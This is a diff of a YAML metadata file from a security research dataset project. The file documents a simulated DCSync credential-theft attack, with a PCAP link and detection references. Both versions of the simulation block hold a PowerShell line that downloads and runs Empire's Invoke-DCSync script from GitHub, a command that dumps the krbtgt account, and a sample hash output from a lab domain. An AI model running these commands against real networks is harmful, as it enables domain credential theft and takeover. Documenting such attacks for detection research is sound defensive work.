@@ -33,23 +33,16 @@ datasets:
       link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190301-CredsAccess-ADReplication/DC01_Windows_PCAP.zip
 
 simulation:
-  environment: Blacksmith
-  tools:
-    - type: Manual
-      name: PowerShell
-      module: PowerShell
-      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1
-  permissions_required:
-    - Domain Admin
-  adversary_view: |-
-    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1')
-    PS C:\Windows\system32> Invoke-DCSync -Users @("krbtgt") | ft -wrap -autosize
-
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1
+  supportingFileUris:
+  commands: |-
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1')
+    Invoke-DCSync -Users @("krbtgt") | ft -wrap -autosize
+  output: |-
     Domain           User   ID  Hash
     ------           ----   --  ----
     mssentinel.local krbtgt 502 a9152b9eac7530531db4dc67aa8eb1e4
-
-    PS C:\Windows\system32>
 
 detection:
   - project: Threat Hunter Playbook
